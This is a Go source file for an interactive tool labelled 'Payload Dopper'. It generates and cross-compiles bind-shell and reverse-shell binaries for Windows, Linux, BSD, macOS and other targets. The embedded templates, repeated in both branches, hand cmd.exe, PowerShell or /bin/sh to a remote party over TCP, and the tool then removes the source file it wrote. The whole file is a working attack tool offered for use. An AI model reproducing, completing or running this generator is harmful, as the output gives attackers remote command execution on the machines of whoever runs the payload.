package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"regexp"
	"runtime"
)

var osOption, cmdORpwsh, archvar, bindORrev, tgtvar, shell, outfile, filecreated string

const (
	goos   = "GOOS"
	goarch = "GOARCH"
)

func genMenu() {
	var gen string
	fmt.Print(">_: ")
	fmt.Scanln(&gen)
	if gen == "back" {
		getTarget()
	}
	if gen == "y" {
		fmt.Print("\nEnter output filename.\n")
		fmt.Print(">_: ")
		fmt.Scan(&outfile)
		namefile := outfile
		if runtime.GOOS == "windows" {
			if cmdORpwsh == "powershell" {
				shell = "C:\\Windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
			}
			if cmdORpwsh == "cmd" {
				shell = "C:\\Windows\\System32\\cmd.exe"
			}
			if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" {
				shell = "/bin/sh"
			}
			if archvar == "arm" {
				shell = "/system/bin/sh"
			}
			bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
			revshell := []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string\n)\nfunc reverseShell(network, address, shell string) {\n\tc, _ := net.Dial(network, address)\n\tcmd := exec.Command(shell)\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\nfunc main() {\n\treverseShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}\n")
			if bindORrev == "reverse" {
				err := ioutil.WriteFile(namefile+".go", revshell, 0644)
				if err != nil {
					fmt.Println("Could not create file")
				}
			}
			if bindORrev == "bind" {
				err := ioutil.WriteFile(namefile+".go", bindshell, 0644)
				if err != nil {
					fmt.Println("Could not create file")
				}
			}
			fmt.Println("Shell file created.")
			cmd := exec.Command("go", "build", namefile+".go")
			cmd.Env = os.Environ()
			cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", goos, osOption))
			cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", goarch, archvar))
			out, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Println("Could not compile")
				os.Exit(0)
			}
			fmt.Printf("%s", out)
			pwd, err := os.Getwd()
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			filecreated := pwd + "/" + namefile + ".go"
			err = os.Remove(fmt.Sprintf("%s", filecreated))
			if err != nil {
				fmt.Println("Could not remove file")
			}
			fmt.Println("Binary Created.")
			showbin := exec.Command("C:\\Windows\\System32\\cmd.exe", "/c dir")
			out1, err := showbin.CombinedOutput()
			if err != nil {
				fmt.Println("Could not run command.")
			}
			fmt.Printf("%s", string(out1))
			main()
		} else {
			if cmdORpwsh == "powershell" {
				shell = "C:\\\\Windows\\\\SYSWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
			}
			if cmdORpwsh == "cmd" {
				shell = "C:\\\\Windows\\\\System32\\\\cmd.exe"
			}
			if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" {
				shell = "/bin/sh"
			}
			if archvar == "arm" {
				shell = "/system/bin/sh"
			}
			bindshell := []byte("package main\nimport (\n\t\"log\"\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string)\nfunc bindShell(network, address, shell string) {\n\tl, err := net.Listen(network, address)\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n\tdefer l.Close()\n\tfor {\n\t\tconn, _ := l.Accept()\n\t\tgo func(c net.Conn) {\n\t\t\tcmd := exec.Command(shell)\n\t\t\tcmd.Stdin = c\n\t\t\tcmd.Stdout = c\n\t\t\tcmd.Stderr = c\n\t\t\tcmd.Run()\n\t\t\tdefer c.Close()\n\t\t}(conn)\n\t}\n}\n\nfunc main() {\n\tbindShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}")
			revshell := []byte("package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\nvar (\n\taddress string\n\tshell string\n)\nfunc reverseShell(network, address, shell string) {\n\tc, _ := net.Dial(network, address)\n\tcmd := exec.Command(shell)\n\tcmd.Stdin = c\n\tcmd.Stdout = c\n\tcmd.Stderr = c\n\tcmd.Run()\n}\nfunc main() {\n\treverseShell(\"tcp\", \"" + tgtvar + "\", \"" + shell + "\")\n}\n")
			if bindORrev == "reverse" {
				err := ioutil.WriteFile(namefile+".go", revshell, 0644)
				if err != nil {
					fmt.Println("Could not create file")
				}
			}
			if bindORrev == "bind" {
				err := ioutil.WriteFile(namefile+".go", bindshell, 0644)
				if err != nil {
					fmt.Println("Could not create file")
				}
			}

			fmt.Println("Shell file created.")
			cmd1 := exec.Command("go", "build", namefile+".go")
			cmd1.Env = os.Environ()
			cmd1.Env = append(cmd1.Env, fmt.Sprintf("%s=%s", goos, osOption))
			cmd1.Env = append(cmd1.Env, fmt.Sprintf("%s=%s", goarch, archvar))
			out1, err := cmd1.CombinedOutput()
			if err != nil {
				fmt.Println("Could not compile")
				os.Exit(0)
			}
			fmt.Printf("%s", out1)
			fmt.Println("Binary Created.")
			if osOption == "windows" {
				showbin1 := exec.Command("file", namefile+".exe")
				out2, err := showbin1.CombinedOutput()
				if err != nil {
					fmt.Println("Could not run command.")
				}
				fmt.Printf("%s", string(out2))
			} else {
				showbin2 := exec.Command("file", namefile)
				out3, err := showbin2.CombinedOutput()
				if err != nil {
					fmt.Println("Could not run command.")
				}
				fmt.Printf("%s", string(out3))
			}

			pwd, err := os.Getwd()
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			filecreated = pwd + "/" + namefile + ".go"
			err = os.Remove(fmt.Sprintf("%s", filecreated))
			if err != nil {
				fmt.Println("Could not remove file")
			}
			main()
		}
	}
	if gen == "n" {
		main()
	} else {
		fmt.Println("Invalid option!")
		genMenu()
	}
}

func generate() {
	genpayload := [8]string{"\n\nFinal Payload Structure {\n", "\tOS: " + osOption + "\n", "\tArch: " + archvar + "\n", "\tType: " + bindORrev + "\n", "\tHost: " + tgtvar + "\n", "\tFormat: " + cmdORpwsh + "\n", "}\n\n", "Generate Payload? (y/n)\n"}
	for o := 0; o < len(genpayload); o++ {
		fmt.Print(genpayload[o])
	}
	genMenu()
}

func tgtMenu() {
	fmt.Print(">_: ")
	fmt.Scanln(&tgtvar)
	if tgtvar == "back" {
		bindOrRev()
	}
	t, err := regexp.Compile(`:`)
	if err != nil {
		fmt.Println("Something aweful just happened.")
	}
	if t.MatchString(tgtvar) == true {
		generate()
	} else {
		fmt.Println("Invalid syntax!")
		tgtMenu()
	}
}

func getTarget() {
	gettgt := [2]string{"\n+...|Enter listening host and port|...+\n\n", "<localhost:port>\n\n"}
	for n := 0; n < len(gettgt); n++ {
		fmt.Print(gettgt[n])
	}
	tgtMenu()
}

func bOrMenu() {
	fmt.Print(">_: ")
	fmt.Scanln(&bindORrev)
	if bindORrev == "back" {
		getArch()
	}
	if bindORrev == "bind" || bindORrev == "reverse" {
		getTarget()
	} else {
		fmt.Println("Invalid option!")
		bOrMenu()
	}
}

func bindOrRev() {
	bindrev := [3]string{"\n+...|Choose a Shell Type|...+\n\n", "- bind\n", "- reverse\n\n"}
	for m := 0; m < len(bindrev); m++ {
		fmt.Print(bindrev[m])
	}
	bOrMenu()
}

func archMenu() {
	fmt.Print(">_: ")
	fmt.Scanln(&archvar)
	if archvar == "back" && osOption == "linux" || archvar == "back" && osOption == "freebsd" || archvar == "back" && osOption == "nacl" || archvar == "back" && osOption == "netbsd" || archvar == "back" && osOption == "openbsd" || archvar == "back" && osOption == "plan9" || archvar == "back" && osOption == "solaris" || archvar == "back" && osOption == "dragonfly" || archvar == "back" && osOption == "darwin" {
		main()
	}
	if archvar == "back" && osOption == "windows" {
		cmdorpwsh()
	}
	if archvar == "386" || archvar == "amd64" || archvar == "arm" || archvar == "arm64" || archvar == "amd64p32" || archvar == "ppc64" || archvar == "ppc64le" || archvar == "mips" || archvar == "mipsle" || archvar == "mips64" || archvar == "mips64le" || archvar == "s390x" || archvar == "sparc64" {
		if osOption == "windows" && archvar == "amd64" || osOption == "windows" && archvar == "386" || osOption == "linux" && archvar == "386" || osOption == "linux" && archvar == "amd64" || osOption == "linux" && archvar == "arm" || osOption == "linux" && archvar == "arm64" || osOption == "linux" && archvar == "ppc64" || osOption == "linux" && archvar == "ppc64le" || osOption == "linux" && archvar == "mips" || osOption == "linux" && archvar == "mipsle" || osOption == "linux" && archvar == "mips64" || osOption == "linux" && archvar == "mips64le" || osOption == "linux" && archvar == "s390x" || osOption == "freebsd" && archvar == "386" || osOption == "freebsd" && archvar == "amd64" || osOption == "freebsd" && archvar == "arm" || osOption == "nacl" && archvar == "386" || osOption == "nacl" && archvar == "amd64p32" || osOption == "nacl" && archvar == "arm" || osOption == "netbsd" && archvar == "386" || osOption == "netbsd" && archvar == "amd64" || osOption == "netbsd" && archvar == "arm" || osOption == "openbsd" && archvar == "386" || osOption == "openbsd" && archvar == "amd64" || osOption == "openbsd" && archvar == "arm" || osOption == "plan9" && archvar == "386" || osOption == "plan9" && archvar == "amd64" || osOption == "plan9" && archvar == "arm" || osOption == "solaris" && archvar == "amd64" || osOption == "dragonfly" && archvar == "amd64" || osOption == "darwin" && archvar == "386" || osOption == "darwin" && archvar == "amd64" {
			bindOrRev()
		} else {
			fmt.Println("Invalid OS/Architecture combination. ", osOption, "/", archvar)
			archMenu()
		}
	} else {
		fmt.Println("Invalid option!")
		archMenu()
	}
}

func getArch() {
	archlist := [14]string{"\n+...|Choose an Architecture|...+\n\n", "- 386\n", "- amd64\n", "- amd64p32\n", "- arm\n", "- arm64\n", "- ppc64\n", "- ppc64le\n", "- mips\n", "- mipsle\n", "- mips64\n", "- mips64le\n", "- s390x\n", "- sparc64\n\n"}
	for l := 0; l < len(archlist); l++ {
		fmt.Print(archlist[l])
	}
	archMenu()
}

func cOpMenu() {
	fmt.Print(">_: ")
	fmt.Scanln(&cmdORpwsh)
	if cmdORpwsh == "back" {
		main()
	}
	if cmdORpwsh == "cmd" || cmdORpwsh == "powershell" {
		getArch()
	} else {
		fmt.Println("Invalid option!")
		cOpMenu()
	}
}

func cmdorpwsh() {
	cmdpwsh := [3]string{"\n+...|CMD or PowerShell|...+\n\n", "- cmd\n", "- powershell\n\n"}
	for k := 0; k < len(cmdpwsh); k++ {
		fmt.Print(cmdpwsh[k])
	}
	cOpMenu()
}

func mainmenu() {
	fmt.Print(">_: ")
	fmt.Scanln(&osOption)
	if osOption == "windows" {
		cmdorpwsh()
	}
	if osOption == "linux" || osOption == "freebsd" || osOption == "nacl" || osOption == "netbsd" || osOption == "openbsd" || osOption == "plan9" || osOption == "solaris" || osOption == "dragonfly" || osOption == "darwin" {
		getArch()
	}
	if osOption == "exit" {
		fmt.Println("Exiting Program.")
		os.Exit(0)
	} else {
		fmt.Println("Invalid option!")
		mainmenu()
	}
}

func main() {
	oslist := [12]string{"Payload Dopper\n\n", "+...|Choose an OS|...+\n\n", "- windows\n", "- linux\n", "- freebsd\n", "- nacl\n", "- netbsd\n", "- openbsd\n", "- plan9\n", "- solaris\n", "- dragonfly\n", "- darwin\n\n"}
	for j := 0; j < len(oslist); j++ {
		fmt.Print(oslist[j])
	}
	mainmenu()
}
